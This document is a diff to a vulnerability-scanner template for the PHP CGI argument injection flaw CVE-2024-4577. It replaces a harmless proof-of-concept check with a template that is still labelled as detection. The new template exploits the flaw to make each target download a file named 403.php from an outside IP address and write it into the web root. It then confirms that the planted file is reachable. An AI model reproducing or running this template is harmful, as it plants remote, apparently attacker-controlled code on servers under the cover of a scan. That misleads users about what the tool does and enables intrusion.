@@ -1,29 +1,78 @@
-id: php-cgi-argument-injection-cve-2024-4577
+id: php-cgi-argument-injection
 
 info:
-  name: PHP CGI Argument Injection (CVE-2024-4577)
-  author: watchTowr,ChiragArtani
+  name: PHP CGI Argument Injection Detection
+  author: yourname
   severity: high
-  description: |
-    This template exploits the PHP CGI Argument Injection vulnerability (CVE-2024-4577) by executing the `phpinfo()` function on the target server. The vulnerability allows remote code execution and was discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3).
+  description: Checks for PHP CGI argument injection vulnerability.
   reference:
-    - https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
-    - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
-  tags: cve,cve2024,rce,php
+    - https://example.com/CVE-2024-4577
+  tags: cve,cve2024,php,injection
 
 requests:
   - raw:
       - |
-        POST /index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
-        Host: {{Hostname}}
+        POST {{BaseURL}}/cgi-bin/php-cgi.exe?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
         Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Content-Length: 93
 
-        <?php echo md5("{{string}}");?>
+        <?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>
+      - |
+        POST {{BaseURL}}/php-cgi/php-cgi.exe?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Content-Length: 93
 
+        <?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>
+      - |
+        POST {{BaseURL}}/cgi-bin/php.exe?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Content-Length: 93
+
+        <?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>
+      - |
+        POST {{BaseURL}}/php-cgi/php.exe?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Content-Length: 93
+
+        <?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>
+      - |
+        POST {{BaseURL}}/index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Content-Length: 93
+
+        <?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>
     matchers-condition: and
     matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET {{BaseURL}}/403.php HTTP/1.1
+        User-Agent: curl/8.3.0
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: status
+        status:
+          - 200
       - type: word
-        part: body
         words:
-          - '{{md5(string)}}'
-# digest: 4a0a00473045022022ce5c4f17e4d8fc33d21bc60cf909dfcbb5c85217e1c7fa201caac4702e7d140221008912f28136b2b7554af51f8c82f896a076d16087aa6b5bff6027c4075a4937da:922c64590222798bb761d5b6d8e72950
+          - "<?php file_put_contents('403.php', file_get_contents('http://157.245.32.216:8000/403.php')); ?>"
+        part: body
